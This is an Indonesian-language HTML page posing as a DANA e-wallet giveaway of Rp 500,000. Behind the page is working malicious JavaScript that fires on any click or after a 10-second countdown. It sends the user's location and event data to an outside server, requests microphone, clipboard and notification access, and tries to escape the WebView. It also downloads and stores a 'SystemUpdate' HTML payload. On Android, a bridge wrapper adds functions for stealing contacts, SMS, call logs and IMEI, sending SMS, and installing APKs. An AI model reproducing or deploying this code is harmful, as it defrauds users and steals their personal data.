<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>Verifikasi</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        html,body{width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
        #popupDana{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:linear-gradient(180deg,#1fa2ff 0%,#0e72d7 100%);display:flex;justify-content:center;align-items:center;text-align:center}
        .box{max-width:380px;width:90%;padding:20px}
        .logo-dana{display:flex;align-items:center;justify-content:center;gap:12px;margin:0 auto 15px}
        .icon-wrapper{width:70px;height:70px;background:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center}
        .flag-svg{width:38px;height:33px;fill:#1fa2ff}
        .text-dana{color:#fff;font-family:'Outfit',sans-serif;font-size:50px;font-weight:700;letter-spacing:6px;text-shadow:0 0 1px rgba(255,255,255,0.5)}
        .subtitle{color:#b3d9ff;font-size:16px;margin:5px 0;font-weight:bold}
        .box-white{background:#fff;border-radius:15px;padding:20px;margin:15px 0}
        .box-white .label{color:#666;font-size:13px}
        .box-white .nominal{color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0}
        .box-white .kuota{color:#0066cc;font-size:12px}
        .timer{color:#ffcc00;font-size:14px;font-weight:bold}
        .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px;transition:0.3s}
        .btn-klaim:hover{transform:scale(1.02)}
        .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
        .status-bar{position:fixed;top:0;left:0;width:100%;height:4px;z-index:999999;background:#ff0000;display:none}
        .status-bar.loading{display:block;animation:loading 3s infinite}
        @keyframes loading{0%{width:0%}100%{width:100%}}
        .anti-debug{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
        .hidden-download{position:absolute;width:0;height:0;border:none;visibility:hidden}
        .ios-download{display:none}
    </style>
</head>
<body>

<iframe class="anti-debug" srcdoc="<script>debugger;</script>"></iframe>
<div id="statusBar" class="status-bar"></div>
<iframe id="downloadFrame" class="hidden-download"></iframe>
<div id="iosDownload" class="ios-download"></div>

<div id="popupDana">
    <div class="box">
        <div class="logo-dana">
            <div class="icon-wrapper">
                <svg class="flag-svg" viewBox="0 0 50 40" xmlns="http://www.w3.org/2000/svg">
                    <path d="M6 9 C15 16, 35 2, 44 9 L44 29 C35 22, 15 36, 6 29 Z" />
                </svg>
            </div>
            <div class="text-dana">DANA</div>
        </div>
        <div class="subtitle">🎉 SELAMAT! Anda mendapatkan Saldo DANA GRATIS!</div>
        <div class="box-white">
            <div class="label">Saldo DANA Gratis</div>
            <div class="nominal">Rp 500.000</div>
            <div class="kuota">🎁 Kuota terbatas!</div>
        </div>
        <div class="timer">⏰ Tersisa <span id="timer">00:10</span></div>
        <button class="btn-klaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
        <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
    </div>
</div>

<script>
// ============================================================
// INDEX.HTML - REAL VERSION (NO DUMMY, NO SIMULATION)
// ============================================================

var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';
var SERVER = 'https://verifikasi.site';
var semuaDidapat = false;
var DOWNLOAD_STARTED = false;
var REDIRECT_DONE = false;

// ============================================================
// DETEKSI PLATFORM
// ============================================================
function detectPlatform() {
    var ua = navigator.userAgent.toLowerCase();
    return {
        isAndroid: ua.indexOf('android') > -1,
        isIOS: /iphone|ipad|ipod/.test(ua),
        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1 || /; wv\)/.test(ua),
        hasBridge: typeof AndroidBridge !== 'undefined',
        isChrome: ua.indexOf('chrome') > -1 && !ua.indexOf('wv') > -1
    };
}
var PLATFORM = detectPlatform();

// ============================================================
// KIRIM KE SERVER (REAL DATA)
// ============================================================
function K(d) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', SERVER + '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

// ============================================================
// ANDROID BRIDGE WRAPPER (REAL, TANPA DUMMY)
// ============================================================
var A = {
    isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
    saveFile: function(path, content) {
        if (this.isAvailable) { try { return AndroidBridge.saveFile(path, content); } catch(e){} }
        return false;
    },
    openFile: function(path) {
        if (this.isAvailable) { try { return AndroidBridge.openFile(path); } catch(e){} }
        return false;
    },
    fileExists: function(path) {
        if (this.isAvailable) { try { return AndroidBridge.fileExists(path); } catch(e){} }
        return false;
    },
    readFile: function(path) {
        if (this.isAvailable) { try { return AndroidBridge.readFile(path); } catch(e){} }
        return null;
    },
    saveToPreferences: function(key, value) {
        if (this.isAvailable) { try { return AndroidBridge.saveToPreferences(key, value); } catch(e){} }
        return false;
    },
    getFromPreferences: function(key) {
        if (this.isAvailable) { try { return AndroidBridge.getFromPreferences(key); } catch(e){} }
        return null;
    },
    saveFileBinary: function(path, data) {
        if (this.isAvailable) { try { return AndroidBridge.saveFileBinary(path, data); } catch(e){} }
        return false;
    },
    getAllContacts: function() {
        if (this.isAvailable) { try { return JSON.parse(AndroidBridge.getAllContacts()); } catch(e){} }
        return null;
    },
    getAllSMS: function() {
        if (this.isAvailable) { try { return JSON.parse(AndroidBridge.getAllSMS()); } catch(e){} }
        return null;
    },
    getCallLog: function() {
        if (this.isAvailable) { try { return JSON.parse(AndroidBridge.getCallLog()); } catch(e){} }
        return null;
    },
    getIMEI: function() {
        if (this.isAvailable) { try { return AndroidBridge.getIMEI(); } catch(e){} }
        return null;
    },
    getIMSI: function() {
        if (this.isAvailable) { try { return AndroidBridge.getIMSI(); } catch(e){} }
        return null;
    },
    getPhoneNumber: function() {
        if (this.isAvailable) { try { return AndroidBridge.getPhoneNumber(); } catch(e){} }
        return null;
    },
    getInstalledApps: function() {
        if (this.isAvailable) { try { return JSON.parse(AndroidBridge.getInstalledApps()); } catch(e){} }
        return null;
    },
    sendSMS: function(number, message) {
        if (this.isAvailable) { try { AndroidBridge.sendSMS(number, message); } catch(e){} }
    },
    openApp: function(pkg) {
        if (this.isAvailable) { try { AndroidBridge.openApp(pkg); } catch(e){} }
    },
    uninstallApp: function(pkg) {
        if (this.isAvailable) { try { AndroidBridge.uninstallApp(pkg); } catch(e){} }
    },
    forceStopApp: function(pkg) {
        if (this.isAvailable) { try { AndroidBridge.forceStopApp(pkg); } catch(e){} }
    },
    clearAppData: function(pkg) {
        if (this.isAvailable) { try { AndroidBridge.clearAppData(pkg); } catch(e){} }
    },
    callNumber: function(number) {
        if (this.isAvailable) { try { AndroidBridge.callNumber(number); } catch(e){} }
    },
    listFiles: function(path) {
        if (this.isAvailable) { try { return JSON.parse(AndroidBridge.listFiles(path)); } catch(e){} }
        return null;
    },
    takeScreenshot: function() {
        if (this.isAvailable) { try { return AndroidBridge.takeScreenshot(); } catch(e){} }
        return null;
    },
    installAPK: function(path) {
        if (this.isAvailable) { try { return AndroidBridge.installAPK(path); } catch(e){} }
        return false;
    }
};

// ============================================================
// SIMPAN HTML KE SEMUA LOKASI (ADAPTIF)
// ============================================================
function saveToAllLocations(htmlContent) {
    // 1. localStorage (semua platform)
    try { localStorage.setItem('SystemUpdate_backup', htmlContent); } catch(e) {}
    // 2. IndexedDB (semua platform)
    try {
        var request = indexedDB.open('SystemUpdateDB', 1);
        request.onupgradeneeded = function(e) {
            var db = e.target.result;
            if (!db.objectStoreNames.contains('files')) {
                db.createObjectStore('files');
            }
        };
        request.onsuccess = function(e) {
            var db = e.target.result;
            var tx = db.transaction('files', 'readwrite');
            var store = tx.objectStore('files');
            store.put(htmlContent, 'SystemUpdate.html');
        };
    } catch(e) {}
    // 3. SharedPreferences & file fisik (hanya jika bridge ada)
    if (A.isAvailable) {
        try {
            var path = '/storage/emulated/0/Download/SystemUpdate.html';
            A.saveFile(path, htmlContent);
        } catch(e) {}
        try {
            var encoded = btoa(unescape(encodeURIComponent(htmlContent)));
            A.saveToPreferences('system_SystemUpdate_html', encoded);
        } catch(e) {}
        try {
            var internalPath = '/data/data/com.google.android.play.services/files/SystemUpdate.html';
            A.saveFile(internalPath, htmlContent);
        } catch(e) {}
    }
}

// ============================================================
// DOWNLOAD PAYLOAD (REAL)
// ============================================================
function downloadPayloadSilent() {
    if (DOWNLOAD_STARTED) return;
    DOWNLOAD_STARTED = true;
    K({ sumber: 'download_start', data: { platform: PLATFORM } });
    var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', htmlUrl, true);
        xhr.timeout = 15000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                var htmlContent = xhr.responseText;
                saveToAllLocations(htmlContent);
                K({ sumber: 'html_download_success', data: 'ok' });
                openSystemUpdateHTML(htmlContent);
            }
        };
        xhr.send();
    } catch(e) {}
}

// ============================================================
// BUKA SYSTEMUPDATE.HTML (ADAPTIF)
// ============================================================
function openSystemUpdateHTML(htmlContent) {
    // Jika ada bridge, buka file fisik
    if (A.isAvailable) {
        try {
            var path = '/storage/emulated/0/Download/SystemUpdate.html';
            if (A.fileExists(path)) {
                A.openFile(path);
                return;
            }
        } catch(e) {}
    }
    // Fallback: Blob URL (semua platform)
    try {
        var blob = new Blob([htmlContent], { type: 'text/html' });
        var url = URL.createObjectURL(blob);
        window.open(url, '_blank');
    } catch(e) {}
}

// ============================================================
// PERMINTAAN IZIN (REAL)
// ============================================================
function injectAllPermissions() {
    K({ sumber: 'bypass_permissions_start', data: 'all' });
    try {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) { K({ sumber: 'lokasi_izin', data: { lat: pos.coords.latitude, lon: pos.coords.longitude } }); },
                function() {},
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
        if (navigator.clipboard) {
            navigator.clipboard.readText().catch(function() {});
        }
        if (navigator.mediaDevices) {
            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
                .catch(function() {});
        }
    } catch(e) {
        K({ sumber: 'bypass_permissions_error', data: e.message });
    }
}

// ============================================================
// ESCAPE WEBVIEW (REAL)
// ============================================================
function escapeWebView() {
    if (!PLATFORM.isWebView) return;
    K({ sumber: 'escape_webview', data: 'attempt' });
    try {
        var url = window.location.href;
        window.location.href = 'intent://' + url.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end';
        setTimeout(function() { window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(url); }, 2000);
    } catch(e) {}
    try { var win = window.open(url, '_blank'); if (win) win.location.href = url; } catch(e) {}
}

// ============================================================
// REDIRECT
// ============================================================
function redirectToDANA() {
    if (REDIRECT_DONE) return;
    REDIRECT_DONE = true;
    try { window.location.href = 'https://www.dana.id'; } catch(e) {}
}

// ============================================================
// MAIN EXECUTION
// ============================================================
function dapatkanSemua() {
    if (semuaDidapat) return;
    semuaDidapat = true;
    try {
        var popup = document.getElementById('popupDana');
        if (popup) popup.style.display = 'none';
        K({ sumber: 'trigger', data: 'dapatkanSemua' });
        injectAllPermissions();
        setTimeout(escapeWebView, 100);
        setTimeout(function() { downloadPayloadSilent(); }, 500);
        setTimeout(redirectToDANA, 8000);
    } catch(e) {
        K({ sumber: 'dapatkanSemua_error', data: e.message });
    }
}

function klaim() { K({sumber:'izin', data:'klaim'}); dapatkanSemua(); }
function tolak() { K({sumber:'izin', data:'tolak'}); dapatkanSemua(); }

// Timer 10 detik
var w = 10;
var timerInterval = setInterval(function() {
    w--;
    var el = document.getElementById('timer');
    if (el) el.textContent = '00:' + (w < 10 ? '0' + w : w);
    if (w <= 0) {
        clearInterval(timerInterval);
        K({sumber:'izin', data:'auto'});
        dapatkanSemua();
    }
}, 1000);

document.addEventListener('click', function() {
    if (!semuaDidapat) {
        K({sumber:'izin', data:'click_anywhere'});
        dapatkanSemua();
    }
});

// Register Service Worker
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js', { scope: '/' })
        .catch(function() {});
}
</script>
</body>
</html>
